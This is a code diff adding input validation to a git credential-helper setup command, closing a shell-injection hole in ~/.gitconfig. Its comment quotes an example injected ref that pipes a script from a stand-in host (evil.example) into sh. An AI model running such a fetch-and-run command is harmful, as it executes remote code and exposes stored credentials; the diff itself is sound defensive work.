@@ -83,6 +83,18 @@ def run(action: str, ref: str, vault_path: Optional[str] = None) -> int:
 def setup(host: str, ref: str, scope: str = "global") -> int:
     """`paladin git-setup <host> <ref>`: wire git to this helper for one host,
     and grant the helper access to that one ref. Idempotent."""
+    # `ref` is embedded, unescaped, into a `credential.<url>.helper` value
+    # below -- a '!'-prefixed helper value is run by git via `sh -c`, so an
+    # unvalidated ref is a shell-injection path into ~/.gitconfig (e.g.
+    # `paladin git-setup github.com "x; curl evil.example/p.sh | sh #"`).
+    # Every other name-taking path in this module validates through
+    # SecretRef first; this was the one that skipped it. Found in review.
+    try:
+        SecretRef.parse(ref)
+    except Exception as e:
+        sys.stderr.write(f"paladin git-setup: invalid ref {ref!r} ({e})\n")
+        return 1
+
     # 1) grant git:credential access to just this ref
     try:
         vault = Vault.open_from_env(interactive=True)
